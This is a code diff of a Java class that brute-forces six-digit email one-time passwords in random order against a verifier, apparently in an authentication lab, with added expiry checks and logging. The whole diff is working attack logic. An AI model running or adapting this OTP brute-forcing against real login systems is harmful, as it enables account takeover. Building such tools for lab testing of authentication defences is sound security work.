@@ -18,18 +18,18 @@ public class RandomEmailOtpAttack {
 
 
 	private final NewAuthLabLoginClient newAuthLabLoginClient;
-	
+
 	private final AttackState attackState;
 
 	public RandomEmailOtpAttack(
-	        NewAuthLabLoginClient newAuthLabLoginClient,
-	        AttackState attackState) {
+			NewAuthLabLoginClient newAuthLabLoginClient,
+			AttackState attackState) {
 
-	    this.newAuthLabLoginClient =
-	            newAuthLabLoginClient;
+		this.newAuthLabLoginClient =
+				newAuthLabLoginClient;
 
-	    this.attackState =
-	            attackState;
+		this.attackState =
+				attackState;
 	}
 
 	// ==============
@@ -47,90 +47,99 @@ public class RandomEmailOtpAttack {
 	// =========================================================
 
 	public AttackResult execute(
-			OtpVerifier otpVerifier,
-			int maxAttempts) {
+	        OtpVerifier otpVerifier,
+	        int maxAttempts) {
 
-		maxAttempts =
-				clampAttempts(maxAttempts);
+	    maxAttempts = clampAttempts(maxAttempts);
 
-		// =====================================================
-		// 000000～999999を作成
-		// =====================================================
+	    int attemptCount = 0;
+	    String otp = null;
+	    boolean success = false;
 
-		int[] candidates =
-				createCandidates();
+	    // 攻撃開始時にタイムアウト状態をリセット
+	    attackState.setOtpTimedOut(false);
 
-		// =====================================================
-		// ランダムな順番にシャッフル
-		// =====================================================
+	    System.out.println("===== ランダムOTP攻撃開始 =====");
 
-		shuffle(candidates);
+	    // 最初に有効期限を確認
+	    if (newAuthLabLoginClient.checkOtpExpiration()) {
 
-		// =====================================================
-		// OTP攻撃
-		// =====================================================
+	        attackState.setOtpTimedOut(true);
 
-		int attemptCount = 0;
+	        System.out.println("!!! TIME UP !!!");
 
-		String otp = null;
+	        return new AttackResult(false, null, 0);
+	    }
 
-		boolean success = false;
-		//有効期限が切れてるかどうか判定する変数をfalseにする_なぎ
-		attackState.setOtpTimedOut(false);
-		for (int candidate : candidates) {
+	    // OTP候補を作成
+	    int[] candidates = createCandidates();
 
-			if (attemptCount
-					>= maxAttempts) {
+	    // ランダムにシャッフル
+	    shuffle(candidates);
 
-				break;
-			}
-			//有効期限確認_なぎ
-		newAuthLabLoginClient.checkOtpExpiration();
+	    // 1秒ごとに期限を確認する
+	    long lastExpirationCheck = System.currentTimeMillis();
 
+	    for (int candidate : candidates) {
 
-		//もし有効期限が切れていたら_なぎ
-		if(attackState.isOtpTimedOut()) {
-			System.out.println(	"!!!TIME UP!!!"	);
-			//終了
-			break;
-		}
-			attemptCount++;
+	        if (attemptCount >= maxAttempts) {
+	            break;
+	        }
 
-			String candidateOtp =
-					String.format(
-							"%06d",
-							candidate);
+	        // 1秒経過したら有効期限確認
+	        long now = System.currentTimeMillis();
 
-			// -------------------------------------------------
-			// OTP候補は1件ずつ必ず表示
-			// -------------------------------------------------
+	        if (now - lastExpirationCheck >= 1000) {
 
-			System.out.println(
-					"ランダムOTP 試行 "
-							+ attemptCount
-							+ " / "
-							+ maxAttempts
-							+ " : "
-							+ candidateOtp);
+	            lastExpirationCheck = now;
 
-			boolean verified =
-					otpVerifier.verify(
-							candidateOtp);
+	            if (newAuthLabLoginClient.checkOtpExpiration()) {
 
-			if (verified) {
+	                attackState.setOtpTimedOut(true);
 
-				otp = candidateOtp;
+	                System.out.println("!!! TIME UP !!!");
+	                System.out.println(
+	                        "OTPの有効期限切れにより攻撃を停止しました。");
 
-				success = true;
+	                break;
+	            }
+	        }
 
-				break;
-			}
-		}
+	        // 攻撃試行
+	        attemptCount++;
 
-		return new AttackResult(
-				success,
-				otp,
-				attemptCount);
+	        String candidateOtp =
+	                String.format("%06d", candidate);
+
+	        System.out.println(
+	                "ランダムOTP 試行 "
+	                        + attemptCount
+	                        + " / "
+	                        + maxAttempts);
+
+	        boolean verified =
+	                otpVerifier.verify(candidateOtp);
+
+	        if (verified) {
+
+	            otp = candidateOtp;
+	            success = true;
+
+	            System.out.println("OTP認証成功！");
+	            break;
+	        }
+	    }
+
+	    System.out.println("===== ランダムOTP攻撃終了 =====");
+	    System.out.println("試行回数 = " + attemptCount);
+	    System.out.println("成功 = " + success);
+	    System.out.println("タイムアウト = "
+	            + attackState.isOtpTimedOut());
+
+	    return new AttackResult(
+	            success,
+	            otp,
+	            attemptCount);
 	}
 
 	// =========================================================
